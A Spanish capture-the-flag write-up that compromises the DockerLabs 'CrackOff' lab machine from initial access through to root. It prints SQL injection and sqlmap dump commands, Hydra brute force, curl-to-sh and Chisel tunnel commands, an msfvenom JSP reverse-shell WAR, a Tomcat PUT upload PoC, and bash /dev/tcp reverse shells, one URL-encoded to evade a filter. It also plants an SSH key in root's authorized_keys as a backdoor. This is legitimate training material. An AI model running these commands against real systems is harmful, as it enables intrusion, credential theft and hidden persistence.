---
title: "DockerLabs - CrackOff - (write-up)"
platform: "dockerlabs"
date: 2025-12-21
tags:
  - Linux
  - SQLi
  - Tomcat-Exploitation
  - Chisel
  - Port-Forwarding
  - KeePass-Cracking
  - Privilege-Escalation
  - Custom-Script-Exploit
estado: "Completado"
toc: true
hide_title_image: true
image:
  path: /assets/img/posts/DockerLabs/crackoff/banner.png
---

##  1. Executive Summary (Resumen Ejecutivo)

### Resumen Ejecutivo: Compromiso Total (Root) - CrackOff

**Estado:** **CRÍTICO** **Objetivo:** Servidor `CrackOff` (`172.17.0.2`)

**Resultado:** Control total del servidor y acceso a datos confidenciales.

---

### Resumen del Ataque (Kill Chain)

El compromiso se realizó en tres fases críticas aprovechando descuidos de configuración:

1. **Entrada:** Se adivinaron las credenciales del panel **Tomcat**. Esto permitió tomar el control del servidor web.
2. **Expansión:** Se encontraron contraseñas en archivos de texto (`mario.txt`) y una base de datos de claves (`KeePass`) olvidada en el sistema.
3. **Control Total:** Se explotó un script con **permisos mal configurados (777)** que era ejecutado por el administrador. Esto otorgó acceso como **ROOT** (máximo nivel).

### Riesgos Identificados

- **Fuga de Datos:** Acceso a todas las contraseñas personales y corporativas de los usuarios.
- **Control Total:** El atacante puede borrar, modificar o espiar cualquier información sin dejar rastro.
- **Persistencia:** Se instaló una "llave maestra" (SSH) para entrar en el futuro sin necesidad de explotar fallos.
    
### Plan de Acción (Soluciones)
- **Contraseñas:** Cambiar todas las claves de servicios y prohibir guardarlas en archivos `.txt`.
- **Permisos:** Corregir los permisos de archivos en `/opt` y `/home` para que solo los dueños puedan editarlos.
- **Seguridad Web:** Restringir el acceso a paneles administrativos solo a IPs autorizadas.

------------

## 2. Reconnaissance and Service Detection

El proceso de reconocimiento se inició con la identificación de la superficie de ataque, confirmando la accesibilidad del _host_ objetivo en la dirección **172.17.0.2**.

### 2.1. Escaneo de Puertos y Servicios

Se ejecutó un escaneo exhaustivo para identificar servicios activos, versiones y posibles vectores de entrada.

**Comandos de Escaneo y Reporte:**
```bash
# Escaneo agresivo de todos los puertos (TCP)
nmap -p- --open --min-rate=5000 -sS -v -Pn -n -A 172.17.0.2 -oX nmap.xml

# Conversión de reporte a formato legible (HTML)
xsltproc nmap.xml -o nmap.html

# Exposición temporal del reporte para análisis remoto
python3 -m http.server 4444
```
![nmap](/assets/img/posts/DockerLabs/crackoff/nmap.png)

### 📊 Servicios Identificados

|**Puerto**|**Servicio**|**Versión**|**Estado**|**Observaciones**|
|---|---|---|---|---|
|**22/tcp**|SSH|OpenSSH 9.6p1 Ubuntu|Open|Vector potencial para persistencia/fuerza bruta.|
|**80/tcp**|HTTP|Apache httpd 2.4.58|Open|Punto de entrada principal (Web App).|
|**8080/tcp**|HTTP|Apache Tomcat|Open|**Critical:** Panel Manager expuesto.|



-------


### 2.2. Análisis del Servicio Web (Puerto 80)

Una detección de servicios más profunda (`-sCV`) en el puerto 80 reveló una configuración crítica de redireccionamiento.
A service scan was performed, exposing a file named **"nota.txt"** inside the FTP service with the **anonymous** user.

```bash
nmap -sCV -p 22,80 -n -Pn 172.17.0.2 -oN servis

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 
|_http-title: CrackOff - Bienvenido
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Resultados clave:**
- **Servidor:** Apache 2.4.58 (Ubuntu).    
- **Título:** "CrackOff - Bienvenido".    
- **Fuzzing de Directorios:** Tras realizar un escaneo con herramientas de descubrimiento (Gobuster/Wfuzz), no se hallaron rutas ocultas fuera del flujo principal de la aplicación.
    

#### 💉 Intento de Inyección (SQLi)

En la página principal, se detectó un campo de entrada donde se probó una carga útil de **SQL Injection** básica para intentar evadir la lógica de autenticación o forzar un error.

- **Payload:** `' or 1=1-- -`    
- **Resultado:** Aunque el bypass directo no comprometió la base de datos de inmediato, el comportamiento de la aplicación sugirió que el foco debía desplazarse hacia la gestión de servicios adicionales.
    

![Web](/assets/img/posts/DockerLabs/crackoff/crack.png) 

### Análisis de Servicio Adicional (FTP/Nota)

Durante el reconocimiento, se identificó la posibilidad de acceso anónimo en servicios complementarios, exponiendo información sensible.

- **Archivo detectado:** `nota.txt`    
- **Hallazgo:** El archivo contenía referencias que permitieron pivotar el ataque hacia el puerto **8080 (Tomcat)**, resultando en un vector mucho más directo.
    


-------------

## 3. Vulnerability Analysis: Gobuster & SQLMap

### Gobuster
Se enumero subdirectorios con la herramienta  **gobuster**
```txt

└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

/db.php               (Status: 302) [Size: 75] [--> error.php]
/error.php            (Status: 200) [Size: 2705]
/index.php            (Status: 200) [Size: 2974]
/index.php            (Status: 200) [Size: 2974]
/login.php            (Status: 200) [Size: 3968]
/server-status        (Status: 403) [Size: 275]
/welcome.php          (Status: 200) [Size: 2800]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```



### 3.1. SQL Injection con SQLMap y Burpsuite

Tras interceptar el tráfico de autenticación con **Burp Suite**, se utilizó el archivo de solicitud (`request.txt`) para automatizar la extracción de datos.

**Comando de Enumeración de DBs:**
```bash
sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent
```

### 📊 Bases de Datos Identificadas
- `crackoff_db` (Objetivo principal)    
- `crackofftrue_db`    
- `information_schema` / `performance_schema`
Se guardo el contenido del request capturado en **burpsuite**.

![Request Burpsuite](/assets/img/posts/DockerLabs/crackoff/burp.png)


Algunos comandos SQLMAP
```bash
# Prueba de concepto. 
sudo sqlmap -u 'http://172.17.0.2/login.php' -X POST --data 'username=test&password=test' -p username,password --batch --dbs --level 5 --risk 3 --random-agent --tamper=space2comment


sudo sqlmap -u 'http://172.17.0.2/login.php' -X POST --data "username=test*&password=' or 1=1-- -" --batch --dbs --level 5 --risk 3 --random-agent
```

### 3.2. Exfiltración de Tablas (Dump)

Se procedió a extraer el contenido de las tablas `users` y `passwords` de la base de datos `crackoff_db`.
Una vez que se tiene el request se lanza el comando para capturar la base crackoff_db

```txt
 sqlmap -r request.txt --batch --dbs --risk=3 --level=5 --random-agent

web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
available databases [4]:
[*] crackoff_db
[*] crackofftrue_db
[*] information_schema
[*] performance_schema
```

```bash
# Dumpeo de la tabla de usuarios
sqlmap -r request.txt --batch -D crackoff_db -T users --dump

# Dumpeo de la tabla de contraseñas
sqlmap -r request.txt --batch -D crackoff_db -T passwords --dump

# Columnas de la tabla passwords
sqlmap -r request.txt --batch -D crackoff_db -T passwords --columns

# Dump parcial (columnas específicas)
sqlmap -r request.txt --batch -D crackoff_db -T passwords -C name,id --dump

```


### Tabla: `passwords` (12 Entradas)

| **ID** | **Contraseña (name)**       | **Notas**                                             |
| ------ | --------------------------- | ----------------------------------------------------- |
| 1      | `password123`               |                                                       |
| 2      | `alicelaultramejor`         |                                                       |
| 3      | `passwordinhack`            |                                                       |
| 4      | `supersecurepasswordultra`  |                                                       |
| 5      | `estrella_big`              |                                                       |
| 6      | `colorcolorido`             |                                                       |
| 7      | `ultramegaverypasswordhack` |                                                       |
| 8      | `unbreackroot`              |                                                       |
| 9      | `happypassword`             |                                                       |
| 10     | `admin12345password`        |                                                       |
| 11     | `carsisgood`                |                                                       |
| 12     | `badmenandwomen`            |                                                       |
| 13     | `superalicepassword`        |                                                       |
| 14     | `flowerpower`               | ----> /var/www/alice_note/note.txt  acceso al keepass |

### Tabla: `users`

Listado de identidades del sistema recuperadas de `crackoff_db`.

| **ID** | **Usuario**    | **Vector Relacionado**               |
| ------ | -------------- | ------------------------------------ |
| 1      | `rejetto`      | Servicio HFS (potencial)             |
| 2      | **`tomitoma`** | **Acceso Tomcat Manager**            |
| 3      | **`alice`**    | Propietaria de KeePass / Root vector |
| 8      | **`rosa`**     | **Punto de entrada SSH**             |
| 9      | **`mario`**    | Usuario intermedio                   |
| 11     | **`root`**     | Objetivo Final                       |



## 4. Ataque de Diccionario: Credential Stuffing (SSH)

Tras la exfiltración de las tablas `users` y `passwords`, se procedió a realizar un ataque de fuerza bruta dirigido para identificar combinaciones válidas que permitieran el acceso remoto vía SSH.

### Metodología
1. **Preparación de Diccionarios:** Se generaron dos archivos limpios basados en los datos del dump de SQLMap:    
    - `users.txt`: Conteniendo los 12 nombres de usuario identificados.        
    - `credenciales.txt`: Conteniendo las 12 contraseñas recuperadas de la tabla `passwords`.        
2. **Ejecución con Hydra:** Se utilizó **Hydra** para automatizar el login cruzado en el puerto 22.
    

**Comando ejecutado:**
```bash
hydra -L users.txt -P credenciales.txt ssh://172.17.0.2 -t4 -f -V -Z
```

- `-L / -P`: Diccionarios de usuarios y contraseñas.
- `-t4`: Número de hilos (frenado para evitar bloqueos del servicio).
- `-f`: Finalizar ejecución al encontrar el primer par válido.
- `-V / -Z`: Modo detallado y visualización de progreso.

### Resultado del Ataque

El ataque fue exitoso, identificando una credencial válida para el usuario **rosa**:

```txt
[22][ssh] host: 172.17.0.2   login: rosa   password: ultramegaverypasswordhack
```

![Acces Rosa](/assets/img/posts/DockerLabs/crackoff/rosa.png)  



--------------------

## 5. Acceso al sistema
Tras obtener acceso inicial con el usuario **rosa**, se procedió a realizar una auditoría local exhaustiva para identificar vectores de escalada de privilegios y persistencia.

### 5.1. Enumeración Automatizada (LinPEAS)

Se transfirió y ejecutó el script `linpeas.sh` para automatizar la búsqueda de rutas de ataque, archivos con permisos incorrectos y configuraciones del kernel vulnerables.

**Comando ejecutado:**

```bash
# En la máquina atacante:
python3 -m http.server 80

# En la máquina víctima (CrackOff):
curl http://<IP_ATACANTE>/linpeas.sh | sh
```

### Hallazgos de LinPEAS

El script resaltó varios puntos críticos en el sistema:
#### A. Kernel Exploits / Suggester

Se identificaron posibles vulnerabilidades a nivel de Kernel que podrían permitir el salto directo a root.

![suggest](/assets/img/posts/DockerLabs/crackoff/sugges.png)  

#### B. Análisis de Configuraciones y Permisos

El reporte de LinPEAS detectó archivos sensibles accesibles por el usuario actual y configuraciones de servicios (como Tomcat y Apache) que exponen vectores de movimiento lateral.

![Contenido](/assets/img/posts/DockerLabs/crackoff/php1.png)  


```txt
Useful software                                                                             
/usr/bin/base64                   
/usr/bin/curl                    
/usr/bin/g++                       
/usr/bin/gcc                       
/usr/bin/make                      
/usr/bin/perl                      
/usr/bin/php                       
/usr/bin/python3                  
/usr/bin/sudo                      
/usr/bin/wget 
```


![Ps Aux](/assets/img/posts/DockerLabs/crackoff/aux1.png)  

```txt
Searching root files in home dirs (limit 30)                                                
/home/                             
/root/                              
/var/www                            
/var/www/html                     
/var/www/html/db.php               
/var/www/html/welcome.php           
/var/www/html/login.php            
/var/www/html/error.php            
/var/www/html/index.php            
/var/www/alice_note               
/var/www/alice_note/note.txt 
```

## 6. Network Pivoting: Chisel Port Forwarding

Tras la enumeración de procesos, se detectó que el servicio **Apache Tomcat** estaba escuchando exclusivamente en una interfaz local o restringida. Para interactuar con el panel administrativo desde la máquina atacante, se estableció un túnel utilizando **Chisel**.

### 6.1. Preparación y Transferencia

Se procedió a descargar y preparar el binario de Chisel en la máquina atacante para su posterior transferencia al _host_ comprometido.

**En la máquina Atacante (Kali):**
```bash
# Descarga y descompresión
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
gunzip chisel_1.11.3_linux_amd64.gz
mv chisel_1.11.3_linux_amd64 chisel
chmod +x chisel

# Servidor de transferencia
python3 -m http.server 9001
```

**En la máquina Víctima (CrackOff):**
```bash
# Descarga del binario
wget http://<IP_KALI>:9001/chisel
chmod +x chisel
```

La siguiente imagen muestra el establecimiento exitoso del túnel inverso mediante Chisel.
![PortForwarding](/assets/img/posts/DockerLabs/crackoff/chisel.png)  


---

## 7. Explotación del Túnel Inverso (Reverse Port Forwarding)

Una vez transferido el binario, se estableció un túnel para exponer el servicio interno de Tomcat (que solo escuchaba en la interfaz local de la víctima) hacia la máquina de ataque.

### 7.1. Configuración del Túnel

**1. Máquina Atacante (Servidor):** Se pone Chisel a la escucha en el puerto 9001 esperando la conexión reversa.

```bash
./chisel server -p 9001 --reverse
```

**2. Máquina Víctima (Cliente):** Se conecta al servidor y redirige el puerto 8080 local hacia el puerto 8080 del atacante.

```bash
cd /tmp
./chisel client <IP_KALI>:9001 R:8080:127.0.0.1:8080
```

---

## 8. Explotación de Apache Tomcat 9.0.93

Con el acceso habilitado en `http://localhost:8080`, se confirmó la versión del servicio y se procedió a la validación de acceso al panel de gestión.

![Tomcat version](/assets/img/posts/DockerLabs/crackoff/tomcat1.png)  

### 8.1. Ataque de Fuerza Bruta / Validación

Aunque se contaba con un dump previo de SQLMap, se utilizó **Hydra** para confirmar qué par de credenciales era válido específicamente para el rol de `manager-gui` en Tomcat.

**Comando ejecutado:**

```bash
hydra -l alice -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-get /manager/html
```
![Usuario Tomcat](/assets/img/posts/DockerLabs/crackoff/user1.png)  

**Resultado de Autenticación** El ataque confirmó las credenciales filtradas anteriormente, permitiendo el acceso al **Tomcat Web Application Manager**. Este panel es el vector definitivo para lograr la ejecución remota de código (RCE).

 Esta sección documenta el paso crítico de la **Intrusión** al sistema a través de la ejecución remota de código (RCE). Aquí tienes el Markdown optimizado para tu Obsidian:

---

## 9. Ejecución Remota de Código (RCE) - Tomcat Deployment

Una vez validado el acceso al **Tomcat Web Application Manager**, se utilizó la funcionalidad de despliegue de archivos WAR para obtener una shell interactiva en el servidor.

### 9.1. Generación del Payload

Se utilizó `msfvenom` para generar un paquete de aplicación web malicioso que contiene una _reverse shell_ escrita en JSP.

**Comando de generación:**

```bash
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=8888 -f war -o shell.war
```

- **Payload:** `java/jsp_shell_reverse_tcp` (Específico para servidores de aplicaciones Java como Tomcat).
- **LHOST/LPORT:** Dirección IP y puerto de la máquina atacante a la escucha.
- **Formato:** `.war` (Web Application Archive).
    
### 9.2. Despliegue y Explotación

El archivo `shell.war` se cargó directamente a través de la interfaz web del **Manager App**, bajo la sección "WAR file to deploy".

**Pasos de ejecución:**
1. **Listener:** Se habilitó un listener en la máquina atacante: `nc -lvnp 8888`.
2. **Despliegue:** Se subió y desplegó el archivo desde el panel.
3. **Activación:** Se accedió a la ruta de la aplicación desplegada: `http://localhost:8080/shell/`.
    


----------
### 9.3. Vector Alternativo: RCE vía HTTP PUT (CVE-2017-12615)

En entornos donde el parámetro `readonly` está configurado como `false` en el archivo `web.xml` de Tomcat, es posible cargar archivos JSP directamente al servidor mediante el método HTTP **PUT**.
### Prueba de Concepto (PoC)
Para verificar la vulnerabilidad, se intenta cargar un archivo JSP simple que ejecute un comando de confirmación.

**Comando de explotación:**

```bash
curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
```

### Detalles Técnicos:
- **El bypass del "/"**: Se añade una barra inclinada `/` al final de la URL (`shell.jsp/`). Esto confunde la validación de archivos de Tomcat en versiones vulnerables, permitiendo que el motor de servlets acepte la escritura del archivo JSP.
- **Impacto**: Si el servidor responde con un código `201 Created`, cualquier usuario puede subir una _Webshell_ completa y tomar control del servidor sin autenticación previa.
    

**Nota de Seguridad** Esta vulnerabilidad es común en servidores mal endurecidos. Si el comando anterior devuelve un código `403 Forbidden` o `405 Method Not Allowed`, significa que el método `PUT` está correctamente restringido o el parámetro `readonly` está en su valor por defecto (`true`).

---------
## 10. Post-Explotación: Estabilización de la Shell (TTY Upgrade)

Tras recibir la conexión reversa del archivo `shell.war`, se obtuvo una shell limitada. Para poder utilizar comandos interactivos (como `su`, `nano`, o el autocompletado con Tab), se procedió al tratamiento de la TTY.

![chisel1](/assets/img/posts/DockerLabs/crackoff/burp.png)  

### Tratamiento TTY y acceso al sistema

Se aplicó la técnica de **Full TTY Upgrade** para obtener una consola robusta que permita la gestión de señales de control (como `Ctrl+C`) sin perder la conexión.

Tratamiento de la tty una vez dentro.
```bash
script /dev/null -c bash
  #         control + z   
  
stty raw -echo; fg
  
reset #(Enter)
xterm #(Enter)

export TERM=xterm
	o
export TERM=xterm-256color

export SHELL=bash  
```


```html
  <user username="tomitoma" password="supersecurepasswordultra" roles="manager-gui,admin-gui"/>
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>

```

### Acceso al usuario tomcat
**Objetivo:** Obtención de Shell y enumeración post-explotación. **Servicio:** Apache Tomcat / HTTP (Puerto 8080)

Credenciales del Panel de Administración
Tras un ataque de fuerza bruta/enumeración en el endpoint `/manager/html`, se identificaron las siguientes credenciales de acceso:
- **Usuario:** `tomitoma`    
- **Password:** `supersecurepasswordultra`    
- **Roles:** `manager-gui`, `admin-gui`
    
Obtención de Shell (RCE)

Utilizando los privilegios de `manager-gui`, se desplegó un archivo de aplicación web (**WAR**) malicioso conteniendo una _JSP Reverse Shell_. Esto permitió la ejecución remota de código (RCE) y la obtención de una consola interactiva bajo el contexto del usuario `tomcat`.
#### Enumeración del Sistema de Archivos

Se procedió a inspeccionar el directorio _home_ del usuario actual para buscar información sensible o vectores de movimiento lateral.
```txt
tomcat@408226713be3:/home$ ls -al ~
total 180
drwx------ 1 tomcat tomcat  4096 Aug 21  2024 .
drwxr-xr-x 1 root   root    4096 Aug 21  2024 ..
drwxr-xr-x 1 tomcat tomcat  4096 Aug 21  2024 bin
drwxr-xr-x 1 tomcat tomcat  4096 Aug 21  2024 conf
drwxr-xr-x 1 tomcat tomcat  4096 Dec 16 20:10 logs
-rwxr-xr-x 1 tomcat tomcat    20 Aug 21  2024 mario.txt  # <--- Credenciales expuestas
drwxr-xr-x 1 tomcat tomcat  4096 Dec 16 20:35 webapps
```

### Acceso al usuario Mario.

```txt
-rwxr-xr-x 1 tomcat tomcat    20 Aug 21  2024 mario.txt# <----------  tomcat@408226713be3:/home$ cat ~/mario.txt mario:marioeseljefe

# Contenido del archivo tomcat@408226713be3:/home$ cat mario.txt mario:marioeseljefe
su mario # Password: marioeseljefe
```

Una vez en la sesión de Mario, se procedió a listar el directorio _home_ y capturar la flag de usuario.

```bash
ls -l ~
cat user.txt
```

**User Flag:** `d099be3ff7be7294c9344daadebca767`

![Acceso a Mario](/assets/img/posts/DockerLabs/crackoff/ls.png)  

#### Exfiltración de Base de Datos (KeePass)

Se identificó un archivo de base de datos de contraseñas de **KeePass** perteneciente a la usuaria `alice`. Este archivo es un objetivo crítico para obtener acceso a otros servicios o escalar privilegios.

**Archivo identificado:** `alice.kdbx`

Se realizó la transferencia del archivo `.kdbx` a la máquina atacante para su posterior análisis _offline_ (Fuerza bruta con `keepass2john` y `john the ripper`).

![KeePass](/assets/img/posts/DockerLabs/crackoff/keepass.png)  

### Acceso al usuario Alice. 
Se obtuvo acceso mediante SSH utilizando credenciales previamente identificadas.

```bash
ssh alice@172.17.0.2
# Password: superalicepassword
```

#### 2. Enumeración de Vectores (PrivEsc)
Tras realizar un reconocimiento del sistema, se identificó un archivo crítico en el directorio `/opt`.
```bash
# Comandos de enumeración ejecutados
find / -name *alice* 2>/dev/null  
ls -al /opt/alice  
ps aux | grep -i alice
```

#### Análisis del Script Inseguro

El archivo `/opt/alice/boss` presentaba una configuración de permisos excesivamente permisiva (`777`), lo que permite a cualquier usuario modificar un script que, por su función, es ejecutado por procesos de mayor privilegio.

**Contenido original del script:**
```bash
alice@408226713be3:/opt/alice$ cat boss 
#!/bin/bash
echo "Necesito los informes de la semana pasada ya Alice." > /home/alice/nota.txt
```

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

#### Solución: Payload codificado en hexadecimal (URL encoded)

Se utilizó una reverse shell clásica en **bash**, codificada con `%HEX` para evadir el filtro del servidor.
##### Payload original (no permitido directamente):
```bash
bash -c "bash -i >& /dev/tcp/<IP_Atacante>/4444 0>&1"
```
##### ✅ Payload funcional (codificado en hexadecimal):
```text
bash+-c+%22bash+-i+%3E%26+/dev/tcp/192.168.0.19/4444+0%3E%261%22
```

-----------

## 11. Escalada de Privilegios: Inyección en Script de Root

### 1. Identificación del Vector

Tras obtener acceso inicial, se realizó una enumeración del sistema de archivos en `/opt/alice`. Se identificó un script con permisos críticos de **lectura, escritura y ejecución para todos los usuarios (777)**, siendo el propietario el usuario `root`.

**Evidencia de permisos:**

```bash
# ls -la /opt/alice
-rwxrwxrwx 1 root  root   136 Dec 19 14:31 boss
```

### Explotación (Reverse Shell Injection)

Aprovechando que el archivo es editable por cualquier usuario, se procedió a inyectar una _payload_ de reverse shell en Bash. El objetivo es que, al ser ejecutado por un proceso de nivel superior o manualmente por root, devuelva una consola con privilegios elevados.

**Pasos realizados:**
1. **Escucha local:** Se habilitó un listener en la máquina atacante. 
    ```bash
    nc -lvnp 4444
    ```
    
2. **Inyección del código:** Se sobrescribió el contenido de `/opt/alice/boss` con la instrucción de conexión.

```bash
echo "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1" > /opt/alice/boss
```
    

### Ejecución y Shell Obtenida

![Acceso root](/assets/img/posts/DockerLabs/crackoff/root.png)



### 11.1 Backdoor con id_rsa
### 1. Generación de Llave (Local)
Si aún no tienes el par de llaves, genéralo en tu máquina atacante:

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa_root -N ""
```

### 2. Inyección de Payload (Remote)

Una vez obtenida la shell de `root`, ejecuta el siguiente bloque para autorizar tu llave:

```bash
# Definir la llave pública (Reemplazar con el contenido de tu id_rsa.pub)
PUB_KEY="tu_clave_ssh_publica_aqui_generada_en_el_paso_anterior"

# Crear estructura de directorios y aplicar permisos restrictivos
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# Persistir llave en authorized_keys
echo "$PUB_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Verificar configuración del servicio SSH
grep -Ei "PermitRootLogin|PubkeyAuthentication" /etc/ssh/sshd_config
```

### 3. Conexión de Retorno

Para acceder desde tu terminal utilizando la llave privada:
 
```bash
ssh -i ./id_rsa_root root@127.17.0.2
```



